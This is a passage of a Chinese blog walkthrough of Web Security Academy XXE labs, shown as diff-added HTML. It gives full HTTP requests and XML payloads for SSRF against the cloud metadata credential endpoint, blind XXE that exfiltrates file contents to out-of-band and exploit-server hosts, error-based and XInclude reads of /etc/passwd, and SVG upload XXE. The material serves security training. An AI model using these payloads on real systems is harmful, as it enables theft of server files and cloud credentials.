+</div><p><img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2.png"
+	width="2523"
+	height="906"
+	srcset="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2_hu_2fff6141960e252b.png 480w, /p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/2_hu_199626e082a90000.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="278"
+		data-flex-basis="668px"
+	
+></p>
+<h3 id="32利用-xxe-执行-ssrf-攻击">3.2.利用 XXE 执行 SSRF 攻击
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">POST /product/stock HTTP/2
+</span></span><span class="line"><span class="cl">Host: 0aaa00220477468580c9262300880030.web-security-academy.net
+</span></span><span class="line"><span class="cl">Cookie: session=zbfNXGA4nnaLwYPatrbLikRgEp9acvBP
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Referer: https://0aaa00220477468580c9262300880030.web-security-academy.net/product?productId=2
+</span></span><span class="line"><span class="cl">Content-Type: application/xml
+</span></span><span class="line"><span class="cl">Content-Length: 247
+</span></span><span class="line"><span class="cl">Origin: https://0aaa00220477468580c9262300880030.web-security-academy.net
+</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
+</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
+</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
+</span></span><span class="line"><span class="cl">Priority: u=0
+</span></span><span class="line"><span class="cl">Te: trailers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [
+</span></span></span><span class="line"><span class="cl"><span class="cp">    &lt;!ENTITY productId SYSTEM &#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;stockCheck&gt;&lt;productId&gt;</span><span class="ni">&amp;productId;</span><span class="nt">&lt;/productId&gt;&lt;storeId&gt;</span>1<span class="nt">&lt;/storeId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/stockCheck&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3.png"
+	width="2528"
+	height="993"
+	srcset="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3_hu_ca92f051c5a2b435.png 480w, /p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/3_hu_af276e124114b254.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="254"
+		data-flex-basis="610px"
+	
+></p>
+<h3 id="33具有带外交互的盲-xxe">3.3.具有带外交互的盲 XXE
+</h3><p><strong>通常可以使用与XXE SSRF攻击相同的技术来检测XXE盲注，但会触发与控制的系统的带外网络交互。</strong></p>
+<p><strong>就是利用DNSlog回显</strong></p>
+<h3 id="34通过-xml-参数实体进行带外交互的盲-xxe">**3.4.**通过 XML 参数实体进行带外交互的盲 XXE
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">POST /product/stock HTTP/2
+</span></span><span class="line"><span class="cl">Host: 0a77000403086e1882040c65003100c2.web-security-academy.net
+</span></span><span class="line"><span class="cl">Cookie: session=q8uas8nKvYT7xLRUu6iXUFmpMrat089L
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Referer: https://0a77000403086e1882040c65003100c2.web-security-academy.net/product?productId=2
+</span></span><span class="line"><span class="cl">Content-Type: application/xml
+</span></span><span class="line"><span class="cl">Content-Length: 220
+</span></span><span class="line"><span class="cl">Origin: https://0a77000403086e1882040c65003100c2.web-security-academy.net
+</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
+</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
+</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
+</span></span><span class="line"><span class="cl">Priority: u=0
+</span></span><span class="line"><span class="cl">Te: trailers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &#34;http://wcc8ll0z0pcnvp3glpi8h98ygpmiafy4.oastify.com&#34;&gt;</span> %xxe; ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;stockCheck&gt;&lt;productId&gt;</span>1<span class="nt">&lt;/productId&gt;&lt;storeId&gt;</span>1<span class="nt">&lt;/storeId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/stockCheck&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="35利用盲-xxe-使用恶意外部-dtd-泄露数据">3.5.利用盲 XXE 使用恶意外部 DTD 泄露数据
+</h3><p><strong>先利用DNSlog检测是否存在XXE漏洞，复制payload</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;file:///etc/hostname&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://ozr08dnrnhzfihq88h5041vq3h9cx6lv.oastify.com/?x=%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span class="line"><span class="cl">%eval;
+</span></span><span class="line"><span class="cl">%exfil;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4.png"
+	width="1895"
+	height="1102"
+	srcset="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4_hu_1fbfea39b290d1f1.png 480w, /p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/4_hu_72eae06b1530d4f1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="171"
+		data-flex-basis="412px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">POST /product/stock HTTP/2
+</span></span><span class="line"><span class="cl">Host: 0aa0003504fcb5778164521500d20028.web-security-academy.net
+</span></span><span class="line"><span class="cl">Cookie: session=eDu0KWXSUXYtvyVCmMAZ2JYHxdRHg3tA
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Referer: https://0aa0003504fcb5778164521500d20028.web-security-academy.net/product?productId=2
+</span></span><span class="line"><span class="cl">Content-Type: application/xml
+</span></span><span class="line"><span class="cl">Content-Length: 232
+</span></span><span class="line"><span class="cl">Origin: https://0aa0003504fcb5778164521500d20028.web-security-academy.net
+</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
+</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
+</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
+</span></span><span class="line"><span class="cl">Priority: u=0
+</span></span><span class="line"><span class="cl">Te: trailers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;https://exploit-0a8100360489b5fb816c51a9017000f6.exploit-server.net/exploit&#34;&gt;</span> %xxe;]&gt;<span class="nt">&lt;stockCheck&gt;&lt;productId&gt;</span>2<span class="nt">&lt;/productId&gt;&lt;storeId&gt;</span>1<span class="nt">&lt;/storeId&gt;&lt;/stockCheck&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5.png"
+	width="1714"
+	height="940"
+	srcset="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5_hu_491323dea478ad4a.png 480w, /p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/5_hu_a722de625737a46f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="437px"
+	
+></p>
+<h3 id="36利用盲-xxe-通过错误消息检索数据">3.6.利用盲 XXE 通过错误消息检索数据
+</h3><p><strong>将这个恶意dtd payload保存在云主机上，并开启共享，以便服务器能加载实体</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;file:///invalid/%file;&#39;&gt;</span>&#34;&gt;
+</span></span><span class="line"><span class="cl">%eval;
+</span></span><span class="line"><span class="cl">%exfil;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">POST /product/stock HTTP/2
+</span></span><span class="line"><span class="cl">Host: 0afc00c503b18075d46254bf005400f7.web-security-academy.net
+</span></span><span class="line"><span class="cl">Cookie: session=AI6ZyMoYuy2FUDcOSqVc5PeIDi43w2z2
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Referer: https://0afc00c503b18075d46254bf005400f7.web-security-academy.net/product?productId=2
+</span></span><span class="line"><span class="cl">Content-Type: application/xml
+</span></span><span class="line"><span class="cl">Content-Length: 244
+</span></span><span class="line"><span class="cl">Origin: https://0afc00c503b18075d46254bf005400f7.web-security-academy.net
+</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
+</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
+</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
+</span></span><span class="line"><span class="cl">Priority: u=0
+</span></span><span class="line"><span class="cl">Te: trailers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &#34;https://exploit-0a8e00bd03cb806fd4e95365018c0047.exploit-server.net/exploit&#34;&gt;</span> %xxe; ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;stockCheck&gt;&lt;productId&gt;</span>1<span class="nt">&lt;/productId&gt;&lt;storeId&gt;</span>1<span class="nt">&lt;/storeId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/stockCheck&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6.png"
+	width="2510"
+	height="899"
+	srcset="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6_hu_a2e37a725ae4b469.png 480w, /p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/6_hu_133077f88af8fb0c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="279"
+		data-flex-basis="670px"
+	
+></p>
+<h3 id="37利用-xinclude-检索文件">3.7.利用 XInclude 检索文件
+</h3><p><strong>也可以使用burp的主动扫描模块，测试是否存在XML注入问题</strong></p>
+<p><img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7.png"
+	width="2462"
+	height="1019"
+	srcset="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7_hu_362001935626b504.png 480w, /p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/7_hu_93026274811a5de2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="579px"
+	
+></p>
+<p><strong>抓包，发现数据包不是XML格式数据包，将productId内容替换为</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;foo</span> <span class="na">xmlns:xi=</span><span class="s">&#34;http://www.w3.org/2001/XInclude&#34;</span><span class="nt">&gt;&lt;xi:include</span> <span class="na">parse=</span><span class="s">&#34;text&#34;</span> <span class="na">href=</span><span class="s">&#34;file:///etc/passwd&#34;</span><span class="nt">/&gt;&lt;/foo&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">POST /product/stock HTTP/2
+</span></span><span class="line"><span class="cl">Host: 0a1d008b04cc106580c2350700390019.web-security-academy.net
+</span></span><span class="line"><span class="cl">Cookie: session=Kk4by4ZvCLdwN9KP8SPwkJOG93UdYLw1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Referer: https://0a1d008b04cc106580c2350700390019.web-security-academy.net/product?productId=2
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 126
+</span></span><span class="line"><span class="cl">Origin: https://0a1d008b04cc106580c2350700390019.web-security-academy.net
+</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
+</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
+</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
+</span></span><span class="line"><span class="cl">Priority: u=0
+</span></span><span class="line"><span class="cl">Te: trailers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">productId=<span class="nt">&lt;foo</span> <span class="na">xmlns:xi=</span><span class="s">&#34;http://www.w3.org/2001/XInclude&#34;</span><span class="nt">&gt;&lt;xi:include</span> <span class="na">parse=</span><span class="s">&#34;text&#34;</span> <span class="na">href=</span><span class="s">&#34;file:///etc/passwd&#34;</span><span class="nt">/&gt;&lt;/foo&gt;</span><span class="err">&amp;</span>storeId=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8.png"
+	width="2546"
+	height="1010"
+	srcset="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8_hu_82b2a4aa6275fa19.png 480w, /p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/8_hu_303227f53d1946d1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="252"
+		data-flex-basis="604px"
+	
+></p>
+<h3 id="38通过图像文件上传利用-xxesvg-xxe">3.8.通过图像文件上传利用 XXE&mdash;SVG XXE
+</h3><p><strong>创建一个后缀为SVG的图像文件,如果文件上传成功后你的DNSlog地址收到回显，则表明存在漏洞</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE note [
+</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY file SYSTEM &#34;http://124.222.183.149:58888/microsoft/&#34; &gt;</span>
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">height=</span><span class="s">&#34;100&#34;</span> <span class="na">width=</span><span class="s">&#34;1000&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;text</span> <span class="na">x=</span><span class="s">&#34;10&#34;</span> <span class="na">y=</span><span class="s">&#34;20&#34;</span><span class="nt">&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/text&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span> ]&gt;<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">&#34;128px&#34;</span> <span class="na">height=</span><span class="s">&#34;128px&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span><span class="s">&#34;http://www.w3.org/1999/xlink&#34;</span> <span class="na">version=</span><span class="s">&#34;1.1&#34;</span><span class="nt">&gt;&lt;text</span> <span class="na">font-size=</span><span class="s">&#34;16&#34;</span> <span class="na">x=</span><span class="s">&#34;0&#34;</span> <span class="na">y=</span><span class="s">&#34;16&#34;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;&lt;/svg&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><font style="color:#DF2A3F;">除了SVG图像能造成XXE外，上传Excel，Word文档也能造成XXE漏洞</font></strong></p>
+<h3 id="39利用-xxe-通过重新利用本地-dtd-来检索数据">3.9.利用 XXE 通过重新利用本地 DTD 来检索数据
+</h3><p><strong>在元素之间插入以下实体内容，</strong><font style="color:rgb(77, 77, 77);background-color:rgb(238, 240, 244);"><strong>这将导入Yelp DTD，然后重新定义ISOamso实体，触发包含/etc/passwd文件内容的错误消息</strong></font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE message [
+</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % ISOamso &#39;
+</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
+</span></span><span class="line"><span class="cl"><span class="ni">&amp;#x25;</span>eval;
+</span></span><span class="line"><span class="cl"><span class="ni">&amp;#x25;</span>error;
+</span></span><span class="line"><span class="cl">&#39;&gt;
+</span></span><span class="line"><span class="cl">%local_dtd;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/9.png"
+	width="2530"
+	height="965"
+	srcset="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/9_hu_368d68527fcd4ef4.png 480w, /p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/9_hu_d2c1e4bb5321d5e4.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="262"
+		data-flex-basis="629px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">POST /product/stock HTTP/2
+</span></span><span class="line"><span class="cl">Host: 0a26004504ede4f781f58428005d00c0.web-security-academy.net
+</span></span><span class="line"><span class="cl">Cookie: session=FWVlNkyfyyWz2rJT8klgq4UhaWFQvhUT
